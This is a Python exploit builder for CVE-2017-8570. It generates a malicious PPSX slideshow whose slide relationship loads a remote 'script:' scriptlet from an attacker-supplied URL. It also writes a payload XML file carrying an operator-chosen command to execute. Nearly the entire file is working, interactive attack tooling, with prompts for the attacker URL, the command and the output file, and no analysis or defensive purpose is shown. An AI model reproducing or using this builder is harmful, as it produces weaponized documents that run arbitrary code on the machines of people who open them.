import os, sys, socket, sys, getopt, binascii, shutil, tempfile
from random import randint
from random import choice
from string import ascii_uppercase
from zipfile import ZipFile, ZIP_STORED, ZipInfo
from urllib.parse import urlparse

def generate_exploit_ppsx(template, docuri, filename):
# Preparing malicious PPSX
	shutil.copy2(template, filename)
	class UpdateableZipFile(ZipFile):
		# Beautiful solution by: http://stackoverflow.com/a/35435548
		"""
		Add delete (via remove_file) and update (via writestr and write methods)
		To enable update features use UpdateableZipFile with the 'with statement',
		Upon  __exit__ (if updates were applied) a new zip file will override the exiting one with the updates
		"""

		class DeleteMarker(object):
			pass
	
		def __init__(self, file, mode="r", compression=ZIP_STORED, allowZip64=False):
			# Init base
			super(UpdateableZipFile, self).__init__(file, mode=mode, compression=compression, allowZip64=allowZip64)
			# track file to override in zip
			self._replace = {}
			# Whether the with statement was called
			self._allow_updates = False
	
		def writestr(self, zinfo_or_arcname, bytes, compress_type=None):
			if isinstance(zinfo_or_arcname, ZipInfo):
				name = zinfo_or_arcname.filename
			else:
				name = zinfo_or_arcname
			# If the file exits, and needs to be overridden,
			# mark the entry, and create a temp-file for it
			# we allow this only if the with statement is used
			if self._allow_updates and name in self.namelist():
				temp_file = self._replace[name] = self._replace.get(name, tempfile.TemporaryFile())
				temp_file.write(bytes)
			# Otherwise just act normally
			else:
				super(UpdateableZipFile, self).writestr(zinfo_or_arcname, bytes, compress_type=compress_type)
	
		def write(self, filename, arcname=None, compress_type=None):
			arcname = arcname or filename
			# If the file exits, and needs to be overridden,
			# mark the entry, and create a temp-file for it
			# we allow this only if the with statement is used
			if self._allow_updates and arcname in self.namelist():
				temp_file = self._replace[arcname] = self._replace.get(arcname, tempfile.TemporaryFile())
				with open(filename, "rb") as source:
					shutil.copyfileobj(source, temp_file)
			# Otherwise just act normally
			else:
				super(UpdateableZipFile, self).write(filename, arcname=arcname, compress_type=compress_type)
	
		def __enter__(self):
			# Allow updates
			self._allow_updates = True
			return self
	
		def __exit__(self, exc_type, exc_val, exc_tb):
			# call base to close zip file, organically
			try:
				super(UpdateableZipFile, self).__exit__(exc_type, exc_val, exc_tb)
				if len(self._replace) > 0:
					self._rebuild_zip()
			finally:
				# In case rebuild zip failed,
				# be sure to still release all the temp files
				self._close_all_temp_files()
				self._allow_updates = False
	
		def _close_all_temp_files(self):
			for temp_file in iter(self._replace.values()):
				if hasattr(temp_file, 'close'):
					temp_file.close()
	
		def remove_file(self, path):
			self._replace[path] = self.DeleteMarker()
	
		def _rebuild_zip(self):
			tempdir = tempfile.mkdtemp()
			try:
				temp_zip_path = os.path.join(tempdir, 'new.zip')
				with ZipFile(self.filename, 'r') as zip_read:
					# Create new zip with assigned properties
					with ZipFile(temp_zip_path, 'w', compression=self.compression, allowZip64=self._allowZip64) as zip_write:
						for item in zip_read.infolist():
							# Check if the file should be replaced / or deleted
							replacement = self._replace.get(item.filename, None)
							# If marked for deletion, do not copy file to new zipfile
							if isinstance(replacement, self.DeleteMarker):
								del self._replace[item.filename]
								continue
							# If marked for replacement, copy temp_file, instead of old file
							elif replacement is not None:
								del self._replace[item.filename]
								# Write replacement to archive,
								# and then close it (deleting the temp file)
								replacement.seek(0)
								data = replacement.read()
								replacement.close()
							else:
								data = zip_read.read(item.filename)
							zip_write.writestr(item, data)
				# Override the archive with the updated one
				shutil.move(temp_zip_path, self.filename)
			finally:
				shutil.rmtree(tempdir)
	
	with UpdateableZipFile(filename, "a") as o:
		o.writestr("ppt/slides/_rels/slide1.xml.rels", ("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
	<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"script:"+docuri+"\" TargetMode=\"External\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout\" Target=\"../slideLayouts/slideLayout1.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing\" Target=\"../drawings/vmlDrawing1.vml\"/></Relationships>").encode())

	return True

class cve_2017_8570(object):
	def __init__(self):

		self.r = '\033[31m'
		self.g = '\033[32m'
		self.y = '\033[33m'
		self.b = '\033[34m'
		self.m = '\033[35m'
		self.c = '\033[36m'
		self.w = '\033[37m'

		try:
			self.url = raw_input(self.r + '    [+]' + self.c + 'Enter URL (http://attackerip.com/exploit.xml). This URL will be included in malicious PPSX file: ' + self.y)
			self.command = raw_input(self.r + '    [+]' + self.c + 'Enter Command to execute: ' + self.y)
			self.output = raw_input(self.r + '    [+]' + self.c + 'Enter Output exploit PPSX: ' + self.y)
			self.template = raw_input(self.r + '    [+]' + self.c + 'Enter PPSX Template (Not Require): ' + self.y)
		except:
			self.url = input(self.r + '    [+]' + self.c + 'Enter URL (http://attackerip.com/exploit.xml). This URL will be included in malicious PPSX file: ' + self.y)
			self.command = input(self.r + '    [+]' + self.c + 'Enter Command to execute: ' + self.y)
			self.output = input(self.r + '    [+]' + self.c + 'Enter Output exploit PPSX: ' + self.y)
			self.template = input(self.r + '    [+]' + self.c + 'Enter PPSX Template (Not Require): ' + self.y)

		if self.template == "":
			self.template = "./CVE_RCE/package/template.ppsx"

		self.domain = urlparse(self.url).netloc
		self.dirOut = os.path.dirname(self.output)
		if self.dirOut != "":
			self.outXML= self.dirOut + self.url.split(self.domain)[1]
		else:
			self.outXML = self.url.split(self.domain)[1].replace("/", "")

		if generate_exploit_ppsx(self.template, self.url, self.output):
			self.generate_xml_file()
			print(self.r + '    [*]' + self.y + ' Done ! output file' + self.r + ' --> ' + self.c + self.output + self.w)

	def generate_xml_file(self):
		path = "./CVE_RCE/package/8570_payload.xml"
		
		f = open(path, "r")
		content = f.read()
		f.close()
		
		content = content.replace("<command>", self.command)
		
		fo = open(self.outXML, "w")
		fo.write(content)
		fo.close()

		print(self.r + '	[*]' + self.y + ' Done ! Output XML File ' + self.r + ' --> ' + self.c + self.outXML + self.w)